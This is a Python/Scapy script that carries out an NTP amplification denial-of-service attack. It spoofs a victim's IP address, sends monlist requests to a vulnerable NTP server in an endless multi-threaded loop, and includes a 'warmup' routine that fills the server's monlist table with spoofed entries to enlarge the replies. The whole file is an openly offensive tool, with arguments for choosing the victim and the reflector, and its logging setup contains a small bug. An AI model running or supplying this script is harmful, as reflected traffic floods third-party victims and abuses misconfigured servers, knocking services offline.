import argparse
import logging
import random
import threading
import datetime

from scapy.all import*

class NTPAmp(object):
    def __init__(self, ntpserv, victim, nthreads, sport, dport):
        # IPs
        self.ntpserv = ntpserv
        self.victim = victim

        # Thread
        self.nthreads = nthreads

        # Port
        self.sport=sport #Target's vulnerable port
        self.dport=dport

        # Logger
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.DEBUG)

        ch = logging.StreamHandler()
        ch.setLevel(logging.DEBUG)

        formatter = logging('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        ch.setFormatter(formatter)

        self.logger.addHandler(ch)

    def add_monlist(self,srcip,sport):
        """
        Send ntp sync(ntpdate command)
        """
        self.logger.info("[+] add monlist entry - {}:{}".format(srcip,sport))
        ntpconf = {
            'leap': 3, #"unknown (clock unsynchronized)",
            'version': 4L,
            'stratum': 0L,
            'poll': 3L,
            'precision': 250L,
            'delay': 1.0,
            'dispersion': 1.0,
            #'ref_id': '',
            'orig': 0.0,
            'sent': datetime.datetime.now().strftime("%a %b %d %H:%M:%S %Y")
        }
        pkt=IP(src=srcip, dst=self.ntpserv)/UDP(sport=sport,dport=self.dport)/NTP(**ntpconf)
        send(pkt)

    def get_monlist(self):
        """
        ntpdc -c monlist
        :return:
        """
        self.logger.info("[+] NTP Amp Attack start!")
        data = "\x17\x00\x03\x2a" + "\x00" * 4
        pkt=IP(dst=self.ntpserv,src=self.victim)/UDP(sport=self.sport,dport=self.dport)/Raw(load=data)
        send(pkt,loop=1)

    def warmup(self):
        """
        call self.add_monlist
        :return:
        """
        self.logger.info("[+] Warm up start!")
        target="192.168.{}.{}"
        for r in range(178, 178+3):
            for c in range(1, 200):
                self.add_monlist(target.format(r, c), random.randint(2000, 65535))

    def attack(self):
        """
        NTP Amplification Attack
        call self.get_monlist
        :return:
        """
        self.logger.info("[*] Spawning {} daemonized threads...".format(self.nthreads))
        threads=[]
        for r in range(self.nthreads):
            thread = threading.Thread(target=self.get_monlist)
            thread.daemon=True
            thread.start()

            threads.append(thread)
        self.logger.info("[+] Finish spawning.")

        for thread in threads:
            thread.join()

def argument_parse():
    parser = argparse.ArgumentParser()
    parser.add_argument('-w', '--warmup', action='store_true', help='Execute warmup')
    parser.add_argument('-s', '--ntpserv', type=str, help='Vulnerable NTP Server IP Address')
    parser.add_argument('-v', '--victim',  type=str, help='Victim IP Address')
    parser.add_argument('-n', '--nthreads',type=int, help='Number of threads (default 1)', default=1)
    parser.add_argument('--sport', type=int, help='Source port. this port is victim port. (default 8080)', default=8080)
    parser.add_argument('--dport', type=int, help='Destination port. this port is ntp service port. (default 123)', default=123)
    args = parser.parse_args()
    return args

if __name__ == '__main__':
    args = argument_parse()
    ntpamp = NTPAmp(args.ntpserv, args.victim, args.nthreads, args.sport, args.dport)
    if args.warmup:
        ntpamp.warmup()
    else:
        ntpamp.attack()